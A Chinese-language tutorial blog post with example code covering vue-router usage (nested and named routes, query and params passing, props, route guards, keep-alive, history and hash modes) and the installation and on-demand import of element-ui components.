![请添加图片描述](https://img-blog.csdnimg.cn/cfefd67ac0a9453593774fa7ab651c1a.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)


### vue-router基本使用
1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。

#### 基本使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

#### 代码
- router/index.js
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../components/About'
import Home from '../components/Home'

// 创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home
        }
    ]
})


```

- main.js
```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
// 引入
import VueRouter from 'vue-router'
// 引入路由器
import router from './router'

// 脚手架中import 语句默认会比其它语句先执行（上升），无论它们是写在其它语句上方还是下方

//关闭Vue的生产提示
Vue.config.productionTip = false

// 应用插件
Vue.use(VueRouter)

//创建vm
const vm = new Vue({
	el: '#app',
	render: h => h(App),
	router: router
})

```

- App.vue
```html
<template>
	<div>
		<div class="row">
			<div class="col-xs-offset-2 col-xs-8">
				<div class="page-header"><h2>Vue Router Demo</h2></div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-2 col-xs-offset-2">
				<div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
					<!-- <a class="list-group-item active" href="./about.html">About</a> -->
					<!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<!-- routr-link最终会变为a标签。其中的to和active-class都是vue-router之后要编译的 -->
					<router-link class="list-group-item" active-class="active" to="/about"
						>About</router-link
					>
					<router-link class="list-group-item" active-class="active" to="/home"
						>Home</router-link
					>
				</div>
			</div>
			<div class="col-xs-6">
				<div class="panel">
					<div class="panel-body">
						<!-- 指定组件的呈现位置，类似插槽中的slot标签 -->
						<router-view></router-view>
					</div>
				</div>
			</div>
		</div>
	</div>
</template>

<script>
export default {
	name: "App",
};
</script>

```

- About.vue
```html
<template>
	<h2>我是About的内容</h2>
</template>

<script>
export default {
	name: "About",
};
</script>

```

- Home.vue
```html
<template>
	<h2>我是Home的内容</h2>
</template>

<script>
export default {
	name: "Home",
};
</script>

```

#### 几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

###  多级路由
1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```html
   <router-link to="/home/news">News</router-link>
   ```


- router/index.js
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'

// 创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    // 此处子路由path不需要再加/
                    path: 'news',
                    component: News
                },
                {
                    // 此处子路由path不需要再加/
                    path: 'message',
                    component: Message
                },
            ]
        }
    ]
})


```

- Home.vue
```html
<template>
	<div>
		<h2>Home组件内容</h2>
		<div>
			<ul class="nav nav-tabs">
				<li>
					<router-link class="list-group-item" active-class to="/home/news"
						>News</router-link
					>
				</li>
				<li>
					<router-link class="list-group-item" active-class to="/home/message"
						>Message</router-link
					>
				</li>
			</ul>
			<router-view></router-view>
		</div>
	</div>
</template>

<script>
export default {
	name: "Home",
};
</script>

```

###  路由传参之query参数
1. 传递参数

   ```html
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

- router/index.js
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    // 此处子路由path不需要再加/
                    path: 'news',
                    component: News
                },
                {
                    // 此处子路由path不需要再加/
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            path: 'detail',
                            component: Detail
                        }
                    ]
                },
            ]
        }
    ]
})


```

- Detail.vue
```html
<template>
	<ul>
		<li>消息编号：{{ $route.query.id }}</li>
		<li>消息标题：{{ $route.query.title }}</li>
	</ul>
</template>

<script>
export default {
	name: "Detail",
	mounted() {
		console.log(this.$route);
	},
};
</script>
```

- Message.vue
```html
<template>
	<div>
		<ul>
			<li v-for="m in messageList" :key="m.id">
				<!-- 跳转路由并携带query参数，to的字符串写法 -->
				<!-- 此处to前加:，表示后面的""中是js表达式，而返回的字符串中有``，表示返回一个模板字符串 -->
				<!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{
					m.title
				}}</router-link
				>&nbsp;&nbsp; -->

				<!-- 跳转路由并携带query参数，to的对象写法(之前的一级、二级路由也可以这么写，只是没必要) -->
				<router-link
					:to="{
						path: '/home/message/detail',
						query: {
							id: m.id,
							title: m.title,
						},
					}"
					>{{ m.title }}</router-link
				>&nbsp;&nbsp;
			</li>
		</ul>
		<hr />
		<router-view></router-view>
	</div>
</template>

<script>
export default {
	name: "Message",
	data() {
		return {
			messageList: [
				{ id: "001", title: "消息001" },
				{ id: "002", title: "消息002" },
				{ id: "003", title: "消息003" },
			],
		};
	},
};
</script>

<style>
</style>
```

### 命名路由
1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                          name:'hello' //给路由命名
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```html
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转。 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```
> 注意：要使用命名路由的方式，则必须用:to="{}"的形式。且无论是几级路由，都可使用。

### 路由传参之params参数
1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```html
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```

- router/index.js
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'news',
                    component: News
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail/:id/:title',
                            component: Detail
                        }
                    ]
                },
            ]
        }
    ]
})


```

- Message.vue
```html
<template>
	<div>
		<ul>
			<li v-for="m in messageList" :key="m.id">
				<!-- 跳转路由并携带params参数，to的字符串写法 -->
				<!-- 此处to前加:，表示后面的""中是js表达式，而返回的字符串中有``，表示返回一个模板字符串 -->
				<!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{
					m.title
				}}</router-link
				>&nbsp;&nbsp; -->

				<!-- 跳转路由并携带params参数，to的对象写法(之前的一级、二级路由也可以这么写，只是没必要) -->
				<!-- 注意：若用params传参，此处只能用name属性，而不能用path属性 -->
				<router-link
					:to="{
						name: 'xiangqing',
						params: {
							id: m.id,
							title: m.title,
						},
					}"
					>{{ m.title }}</router-link
				>&nbsp;&nbsp;
			</li>
		</ul>
		<hr />
		<router-view></router-view>
	</div>
</template>

<script>
export default {
	name: "Message",
	data() {
		return {
			messageList: [
				{ id: "001", title: "消息001" },
				{ id: "002", title: "消息002" },
				{ id: "003", title: "消息003" },
			],
		};
	},
};
</script>

<style>
</style>
```

- Detail.vue
```html
<template>
	<ul>
		<li>消息编号：{{ $route.params.id }}</li>
		<li>消息标题：{{ $route.params.title }}</li>
	</ul>
</template>

<script>
export default {
	name: "Detail",
	mounted() {
		console.log(this.$route);
	},
};
</script>
```

### 路由的props配置
#### 对象形式的props传参
![在这里插入图片描述](https://img-blog.csdnimg.cn/b92c96d5b9f1495aa10d069e05318692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a69ca836362841b0ad87eeeb02ca0b36.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

#### 布尔值形式的props传参
- route/index.js
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'news',
                    component: News
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail/:id/:title',
                            component: Detail,
                            // props的第一种写法。值为对象。该对象中的所有key-value都会以props的形式传给Detail组件
                            // props: { a: 1, b: 'hello' }

                            // props的第二种写法。值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件
                            props: true
                        }
                    ]
                },
            ]
        }
    ]
})


```

- Detail.vue
```html
<template>
	<ul>
		<li>消息编号：{{ id }}</li>
		<li>消息标题：{{ title }}</li>
	</ul>
</template>

<script>
export default {
	name: "Detail",
	props: ["id", "title"],
	mounted() {
		console.log(this.$route);
	},
};
</script>
```

- Message.vue
```html
<template>
	<div>
		<ul>
			<li v-for="m in messageList" :key="m.id">
				<router-link
					:to="{
						name: 'xiangqing',
						params: {
							id: m.id,
							title: m.title,
						},
					}"
					>{{ m.title }}</router-link
				>&nbsp;&nbsp;
			</li>
		</ul>
		<hr />
		<router-view></router-view>
	</div>
</template>

<script>
export default {
	name: "Message",
	data() {
		return {
			messageList: [
				{ id: "001", title: "消息001" },
				{ id: "002", title: "消息002" },
				{ id: "003", title: "消息003" },
			],
		};
	},
};
</script>

<style>
</style>
```

#### 函数形式的props传参
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'news',
                    component: News
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail/:id/:title',
                            component: Detail,
                            // props的第三种写法。值为函数。此种写法既可以传query参数，也可以传params
                            // 此处的$route即为Message组件的$route属性
                            /* props($route) {
                                return { id: $route.query.id, title: $route.query.title }
                            } */
                            /* props({ query }) {
                                return { id: query.id, title: query.title }
                            } */
                            props({ query: { id, title } }) {
                                return { id: id, title: title }
                            }
                        }
                    ]
                },
            ]
        }
    ]
})


```

#### 总结
	作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

### router-link的replace模式

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：
```html
<router-link :replace="true" .......>News</router-link>
<!--简写-->
<router-link replace .......>News</router-link>
```

### 编程式路由导航
1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退。形参为数字，正数前进（1前进一次，2前进两次），负数相反
   ```
> push及replace中的配置参数可参照router-link组件标签中to的对象式写法

### 缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   ```html
   <!-- 没写include默认keep-alive中的所有组件都可以保持挂载，不被销毁。include中的值为组件名 -->
   <!--keep-alive是用来包裹router-view的，不可以包裹其它东西-->
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   
   <!--缓存多个路由组件-->
   <keep-alive :include="['News','Message']"> 
       <router-view></router-view>
   </keep-alive>
   ```
> 注意：以下name才为为组件名
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/8770d09a02af4e278edc08fd4d172bd7.png)
### 两个新的生命周期钩子
1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。

```html
<template>
	<ul>
		<li :style="{ opacity }">欢迎学习Vue</li>
		<li>news001 <input type="text" /></li>
		<li>news002 <input type="text" /></li>
		<li>news003 <input type="text" /></li>
	</ul>
</template>

<script>
export default {
	name: "News",
	data() {
		return {
			opacity: 1,
		};
	},
	// 此处的场景：该组件被keep-alive包裹，当开启定时器后，若将定时器关闭放到beforeDestroy中，将无法被销毁，同时路由重新切换到该组件也无法执行mounted函数。而用activated和deactivated则可以实现
	/* mounted() {
		this.timer = setInterval(() => {
			this.opacity -= 0.01;
			console.log("!");
			if (this.opacity <= 0) this.opacity = 1;
		}, 16);
	},
	beforeDestroy() {
		clearInterval(this.timer);
	}, */
	 activated() {
		this.timer = setInterval(() => {
			this.opacity -= 0.01;
			console.log("!");
			if (this.opacity <= 0) this.opacity = 1;
		}, 16);
		console.log("News组件被激活了");
	},
	deactivated() {
		clearInterval(this.timer);
		console.log("News组件失活了");
	}, 
};
</script>

<style>
</style>
```

###  路由守卫
#### 全局前置路由守卫
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
const router = new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About,
        },
        {
            name: 'zhuye',
            path: '/home',
            component: Home,
            children: [
                {
                    name: 'xinwen',
                    path: 'news',
                    component: News,
                    meta: { isAuth: true }

                },
                {
                    name: 'xiaoxi',
                    path: 'message',
                    component: Message,
                    meta: { isAuth: true },
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            props({ query: { id, title } }) {
                                return { id: id, title: title }
                            }
                        }
                    ]
                },
            ]
        }
    ]
})

// 全局前置路由守卫 - 初始化的时候及每次路由切换之前被调用
router.beforeEach((to, from, next) => {
    // if (to.path === '/home/news' || to.path === '/home/message') {
    // if (to.name === 'xinwen' || to.name === 'xiaoxi') {
    if (to.meta.isAuth) {   // 通过在路由配置中添加meta属性来进行判断是否需要鉴权
        if (localStorage.getItem('school') === 'xxc') {
            next()
        } else {
            alert('学校名不对，无法访问')
        }
    } else {
        next()
    }
})

export default router


```


#### 全局后置路由守卫
```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'

// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
const router = new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About,
            meta: { title: '关于' }
        },
        {
            name: 'zhuye',
            path: '/home',
            component: Home,
            meta: { title: '主页' },
            children: [
                {
                    name: 'xinwen',
                    path: 'news',
                    component: News,
                    meta: { isAuth: true, title: '新闻' }

                },
                {
                    name: 'xiaoxi',
                    path: 'message',
                    component: Message,
                    meta: { isAuth: true, title: '消息' },
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            props({ query: { id, title } }) {
                                return { id: id, title: title }
                            },
                            meta: { isAuth: true, title: '详情' }
                        }
                    ]
                },
            ]
        }
    ]
})

// 全局前置路由守卫 - 初始化的时候及每次路由切换之前被调用
router.beforeEach((to, from, next) => {
    // if (to.path === '/home/news' || to.path === '/home/message') {
    // if (to.name === 'xinwen' || to.name === 'xiaoxi') {
    if (to.meta.isAuth) {   // 通过在路由配置中添加meta属性来进行判断是否需要鉴权
        if (localStorage.getItem('school') === 'xxc') {
            // document.title = to.meta.title || 'XXC'
            next()
        } else {
            alert('学校名不对，无法访问')
        }
    } else {
        // document.title = to.meta.title || 'XXC'
        next()
    }
})

// 全局后置路由守卫 - 初始化的时候及每次路由切换之后被调用
router.afterEach((to, from) => {
    // 此处场景：要修改网页的title。且要保证若访问无权限的路由时，不能改title。此时若写在前置守卫中要写两次。而后置守卫中只需要写一次即可
    document.title = to.meta.title || 'XXC'
})

export default router

```

#### 独享路由守卫
![在这里插入图片描述](https://img-blog.csdnimg.cn/63fd5a87401440fb9ffb47e7ed4ef949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
   ```

> 注意：独享路由守卫只有前置，没有后置。但可以配合全局后置路由守卫一起使用。

#### 组件内路由守卫
   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```

- About.vue
```html
<template>
	<h2>我是About的内容</h2>
</template>

<script>
export default {
	name: "About",
	// 通过路由规则，进入该组件时被调用(从其它组件进入该组件)
	// 此处的to一定是本路由组件相关信息
	beforeRouteEnter(to, from, next) {
		console.log("App---beforeRouteEnter");
		if (to.meta.isAuth) {
			if (localStorage.getItem("school") === "xxc") {
				next();
			} else {
				alert("学校名不对，无法访问");
			}
		} else {
			next();
		}
	},
	// 通过路由规则，离开该组件时被调用(从该组件切换到其它组件)
	// 此处的from一定是本路由组件相关信息
	// 注意此处有next，与全局后置路由守卫（router.afterEach）不同
	beforeRouteLeave(to, from, next) {
		next();
	},
};
</script>

```

### history模式与hash模式
1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

>修改方式：在定义路由的route/index.js文件中进行修改
>![在这里插入图片描述](https://img-blog.csdnimg.cn/5f9f36db9d6849dea4e821e28d56386e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
- 后端代码
```js
const express = require('express')
const history = require('connect-history-api-fallback')

const app = express()

app.use(history())
app.use(express.static(__dirname + '/static'))

app.listen(5005, (err) => {
    if (!err) console.log('服务器启动成功了!')
})
```

## element-ui的使用
1. 安装
>npm i element-ui

2. 基本使用

- main.js
```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'

//完整引入
//引入ElementUI组件库
import ElementUI from 'element-ui';
//引入ElementUI全部样式
import 'element-ui/lib/theme-chalk/index.css';

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用ElementUI
Vue.use(ElementUI);

//创建vm
new Vue({
	el: '#app',
	render: h => h(App),
})

```

- App.vue
```html
<template>
  <div>
		<button>原生的按钮</button>
		<input type="text">
		<el-row>
			<el-button>默认按钮</el-button>
			<el-button type="primary">主要按钮</el-button>
			<el-button type="success">成功按钮</el-button>
			<el-button type="info">信息按钮</el-button>
			<el-button type="warning">警告按钮</el-button>
			<el-button type="danger">危险按钮</el-button>
		</el-row>
		<el-date-picker
      type="date"
      placeholder="选择日期">
    </el-date-picker>
		<el-row>
			<el-button icon="el-icon-search" circle></el-button>
			<el-button type="primary" icon="el-icon-s-check" circle></el-button>
			<el-button type="success" icon="el-icon-check" circle></el-button>
			<el-button type="info" icon="el-icon-message" circle></el-button>
			<el-button type="warning" icon="el-icon-star-off" circle></el-button>
			<el-button type="danger" icon="el-icon-delete" circle></el-button>
		</el-row>
  </div>
</template>

<script>
	export default {
		name:'App',
	}
</script>

```

3. 按需引入
- babel.config.js
```js
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
    ["@babel/preset-env", { "modules": false }],
  ],
  plugins: [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}

```

- mains.js
```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//按需引入
import { Button, Row, DatePicker } from 'element-ui';

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用ElementUI
Vue.component('el-button', Button);
Vue.component('atguigu-row', Row);
Vue.component('atguigu-date-picker', DatePicker);
// 配置好babel.config.js后即可不用再引入样式


//创建vm
new Vue({
	el: '#app',
	render: h => h(App),
})

```

- App.vue
```html
<template>
  <div>
		<button>原生的按钮</button>
		<input type="text">
		<atguigu-row>
			<el-button>默认按钮</el-button>
			<el-button type="primary">主要按钮</el-button>
			<el-button type="success">成功按钮</el-button>
			<el-button type="info">信息按钮</el-button>
			<el-button type="warning">警告按钮</el-button>
			<el-button type="danger">危险按钮</el-button>
		</atguigu-row>
		<atguigu-date-picker
      type="date"
      placeholder="选择日期">
    </atguigu-date-picker>
		<atguigu-row>
			<el-button icon="el-icon-search" circle></el-button>
			<el-button type="primary" icon="el-icon-s-check" circle></el-button>
			<el-button type="success" icon="el-icon-check" circle></el-button>
			<el-button type="info" icon="el-icon-message" circle></el-button>
			<el-button type="warning" icon="el-icon-star-off" circle></el-button>
			<el-button type="danger" icon="el-icon-delete" circle></el-button>
		</atguigu-row>
  </div>
</template>

<script>
	export default {
		name:'App',
	}
</script>

```
